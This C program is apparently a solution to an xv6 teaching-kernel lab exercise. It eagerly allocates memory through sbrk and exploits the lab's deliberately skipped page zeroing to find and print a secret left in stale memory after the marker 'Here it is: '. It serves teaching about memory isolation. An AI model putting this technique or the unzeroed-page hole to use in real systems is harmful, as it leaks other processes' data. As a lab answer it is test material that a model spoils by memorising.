#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"

#define PGSIZE 4096

// SBRK_EAGER is defined in kernel/vm.h as 1
#define SBRK_EAGER 1

int
main(int argc, char *argv[])
{
  int size = 128 * PGSIZE;

  // sys_sbrk(n, SBRK_EAGER) → eager allocation via uvmalloc,
  // whose memset is skipped (LAB_SYSCALL), so pages retain stale data.
  char *data = sys_sbrk(size, SBRK_EAGER);

  if (data == SBRK_ERROR) {
    fprintf(2, "attack: sbrk failed\n");
    exit(1);
  }

  char *marker = "Here it is: ";
  int mlen = strlen(marker);
  for (int i = 0; i + mlen < size; i++) {
    if (memcmp(data + i, marker, mlen) != 0)
      continue;
    char *secret = data + i + mlen;
    int j = 0;
    while (j < 256 && secret[j] != '\0' &&
           ((secret[j] >= '0' && secret[j] <= '9') ||
            (secret[j] >= 'a' && secret[j] <= 'z') ||
            (secret[j] >= 'A' && secret[j] <= 'Z')))
      j++;
    if (j > 0) {
      char buf[257];
      memmove(buf, secret, j);
      buf[j] = '\0';
      printf("%s\n", buf);
      exit(0);
    }
  }
  exit(0);
}